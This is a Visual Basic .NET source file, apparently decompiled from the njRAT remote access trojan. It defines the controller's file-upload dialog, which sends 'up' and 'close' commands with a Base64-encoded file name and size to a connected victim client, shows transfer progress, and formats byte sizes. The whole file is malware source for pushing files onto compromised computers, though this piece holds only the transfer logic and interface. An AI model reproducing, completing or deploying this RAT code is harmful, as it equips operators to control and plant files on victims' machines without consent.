Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT
Imports System.Text

Public Class up

    Public c As Client
    Public FN As String
    Public FS As FileStream
    Public os As Integer
    Public SZ As Integer
    Public TMP As String

    Public Sub New()
        Me.os = 0
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.c.Send(("close" & ind.Y & Me.FN))
        Me.FS.Close()
        Me.FS.Dispose()
        File.Delete((Application.StartupPath & "\" & (Me.GetHashCode)))
        Me.Button1.Enabled = False
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.Lv1.Items.Item(2).SubItems.Item(0).Text = siz((CInt((Me.ProgressBar1.Value - Me.os))))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items.Item(3).SubItems.Item(0).Text = siz((Me.ProgressBar1.Value))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub up_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.FS = New FileStream(Me.TMP, FileMode.Open)
        Me.Lv1.Items.Item(0).SubItems.Item(0).Text = New FileInfo(Me.TMP).Name
        Me.Lv1.Items.Item(1).SubItems.Item(0).Text = siz((Me.SZ))
        Me.Lv1.Items.Item(2).SubItems.Item(0).Text = siz((0))
        Me.Lv1.Items.Item(3).SubItems.Item(0).Text = siz((0))
        Me.ProgressBar1.Maximum = Me.SZ
        Me.c.Send(String.Concat(New String() {"up", ind.Y, ENB(Me.FN), ind.Y, (Me.SZ)}))
        Me.Lv1.FX()
        Me.Timer1.Enabled = True
    End Sub

    Public Shared Function siz(ByVal Size As String) As String
        Dim num As Integer
        If (Size.Length < 4) Then
            Return (Size & " Bytes")
        End If
        Dim str2 As String = (CDbl((Conversions.ToDouble(Size) / 1024)))
        Dim str As String = " KB"
        If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
            Dim instance As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
            str2 = (NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing))
            If (NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing).ToString.Length > 3) Then
                num = Conversions.ToInteger(Strings.Mid((NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing)), 1, 3))
            Else
                num = Conversions.ToInteger(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing))
            End If
        End If
        If (str2.Length > 3) Then
            str2 = (CDbl((Conversions.ToDouble(str2) / 1024)))
            str = " MB"
            If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
                Dim array2 As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
                str2 = (NewLateBinding.LateIndexGet(array2, New Object() {0}, Nothing))
                If (NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing).ToString.Length > 3) Then
                    num = Conversions.ToInteger(Strings.Mid((NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing)), 1, 3))
                Else
                    num = Conversions.ToInteger(NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing))
                End If
            End If
        End If
        If (str2.Length > 3) Then
            str2 = (CDbl((Conversions.ToDouble(str2) / 1024)))
            str = " GB"
            If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
                Dim array3 As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
                str2 = (NewLateBinding.LateIndexGet(array3, New Object() {0}, Nothing))
                If (NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing).ToString.Length > 3) Then
                    num = Conversions.ToInteger(Strings.Mid((NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing)), 1, 3))
                Else
                    num = Conversions.ToInteger(NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing))
                End If
            End If
        End If
        Return (str2 & "." & (num) & str)
    End Function

    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function

End Class